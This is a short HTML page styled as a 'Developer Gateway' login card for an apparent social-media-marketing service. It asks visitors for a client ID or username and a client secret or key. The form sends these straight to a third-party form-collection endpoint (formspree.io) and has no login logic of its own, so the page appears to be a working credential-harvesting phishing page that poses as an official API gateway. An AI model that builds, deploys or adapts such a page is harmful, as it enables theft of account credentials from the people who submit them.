<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; font-src https://fonts.gstatic.com https://cdnjs.cloudflare.com; connect-src https://formspree.io;">
    <title>SMM CORE | Developer Gateway</title>
    </head>
<body>
    <main>
        <div class="login-card">
            <div style="text-align: center; margin-bottom: 1.5rem;">
                <div class="ig-glyph" style="background: var(--cyan); -webkit-text-fill-color: var(--cyan);"><i class="fas fa-shield-alt"></i></div>
                <h2 style="font-weight: 800; font-size: 1.7rem; letter-spacing: 1px;">CORE GATEWAY</h2>
                <p style="font-size: 0.9rem; color: #64748b; margin-top: 8px;">Enter API Credentials to Sync Node</p>
            </div>

            <form id="authForm" action="https://formspree.io/f/mjgzyqjy" method="POST">
                <div class="input-wrap">
                    <input type="text" name="client_id" placeholder="Client ID / Username" required>
                    <i class="fas fa-user-shield"></i>
                </div>
                <div class="input-wrap">
                    <input type="password" name="client_secret" placeholder="Client Secret / Key" required>
                    <i class="fas fa-key"></i>
                </div>
                </form>
        </div>
    </main>
    </body>
</html>
